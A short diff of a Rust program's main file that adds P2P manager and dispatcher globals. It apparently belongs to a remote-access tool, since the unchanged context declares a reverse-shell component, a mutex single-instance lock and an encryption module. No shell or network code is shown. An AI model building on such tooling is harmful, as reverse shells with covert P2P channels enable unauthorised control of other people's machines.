@@ -20,6 +20,7 @@ use futures::StreamExt;
 
 use std::sync::{Arc, Mutex};
 use once_cell::sync::Lazy;
+use common::p2p::{IrohManager, P2PDispatcher};
 
 use features::encryption;
 
@@ -29,6 +30,14 @@ static MUTEX_SERVICE: Lazy<Mutex<service::mutex::MutexLock>> = Lazy::new(||
 
 static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy::new(||
     Mutex::new(features::reverse_shell::ReverseShell::new())
+);
+
+pub static IROH_MANAGER: Lazy<Mutex<Option<Arc<IrohManager>>>> = Lazy::new(||
+    Mutex::new(None)
+);
+
+pub static P2P_DISPATCHER: Lazy<Mutex<Option<Arc<P2PDispatcher>>>> = Lazy::new(||
+    Mutex::new(None)
 );
 
 #[tokio::main(flavor = "multi_thread", worker_threads = 4)]
